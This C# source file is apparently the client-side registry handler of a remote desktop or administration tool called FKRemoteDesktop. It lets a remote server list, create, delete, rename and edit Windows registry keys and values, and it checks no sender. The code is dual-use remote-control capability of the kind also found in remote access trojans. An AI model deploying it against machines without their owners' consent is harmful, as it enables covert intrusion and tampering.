using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Structs;
using System;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class RegistryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoLoadRegistryKey ||
                                                     message is DoCreateRegistryKey ||
                                                     message is DoDeleteRegistryKey ||
                                                     message is DoRenameRegistryKey ||
                                                     message is DoCreateRegistryValue ||
                                                     message is DoDeleteRegistryValue ||
                                                     message is DoRenameRegistryValue ||
                                                     message is DoChangeRegistryValue;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoLoadRegistryKey msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoLoadRegistryKey");
                    Execute(sender, msg);
                    break;

                case DoCreateRegistryKey msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoCreateRegistryKey");
                    Execute(sender, msg);
                    break;

                case DoDeleteRegistryKey msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoDeleteRegistryKey");
                    Execute(sender, msg);
                    break;

                case DoRenameRegistryKey msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoRenameRegistryKey");
                    Execute(sender, msg);
                    break;

                case DoCreateRegistryValue msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoCreateRegistryValue");
                    Execute(sender, msg);
                    break;

                case DoDeleteRegistryValue msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoDeleteRegistryValue");
                    Execute(sender, msg);
                    break;

                case DoRenameRegistryValue msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoRenameRegistryValue");
                    Execute(sender, msg);
                    break;

                case DoChangeRegistryValue msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoChangeRegistryValue");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoLoadRegistryKey message)
        {
            GetRegistryKeysResponse responsePacket = new GetRegistryKeysResponse();
            try
            {
                SRegistrySeeker seeker = new SRegistrySeeker();
                seeker.BeginSeeking(message.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = message.RootKeyName;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoCreateRegistryKey message)
        {
            GetCreateRegistryKeyResponse responsePacket = new GetCreateRegistryKeyResponse();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryHelper.CreateRegistryKey(message.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Match = new RegSeekerMatch
            {
                Key = newKeyName,
                Data = RegistryKeyHelper.GetDefaultValues(),
                HasSubKeys = false
            };
            responsePacket.ParentPath = message.ParentPath;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoDeleteRegistryKey message)
        {
            GetDeleteRegistryKeyResponse responsePacket = new GetDeleteRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryHelper.DeleteRegistryKey(message.KeyName, message.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = message.ParentPath;
            responsePacket.KeyName = message.KeyName;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoRenameRegistryKey message)
        {
            GetRenameRegistryKeyResponse responsePacket = new GetRenameRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryHelper.RenameRegistryKey(message.OldKeyName, message.NewKeyName, message.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = message.ParentPath;
            responsePacket.OldKeyName = message.OldKeyName;
            responsePacket.NewKeyName = message.NewKeyName;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoCreateRegistryValue message)
        {
            GetCreateRegistryValueResponse responsePacket = new GetCreateRegistryValueResponse();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryHelper.CreateRegistryValue(message.KeyPath, message.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = RegistryKeyHelper.CreateRegValueData(newKeyName, message.Kind, message.Kind.GetDefault());
            responsePacket.KeyPath = message.KeyPath;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoDeleteRegistryValue message)
        {
            GetDeleteRegistryValueResponse responsePacket = new GetDeleteRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryHelper.DeleteRegistryValue(message.KeyPath, message.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = message.ValueName;
            responsePacket.KeyPath = message.KeyPath;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoRenameRegistryValue message)
        {
            GetRenameRegistryValueResponse responsePacket = new GetRenameRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryHelper.RenameRegistryValue(message.OldValueName, message.NewValueName, message.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = message.KeyPath;
            responsePacket.OldValueName = message.OldValueName;
            responsePacket.NewValueName = message.NewValueName;
            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoChangeRegistryValue message)
        {
            GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryHelper.ChangeRegistryValue(message.Value, message.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = message.KeyPath;
            responsePacket.Value = message.Value;
            client.Send(responsePacket);
        }
    }
}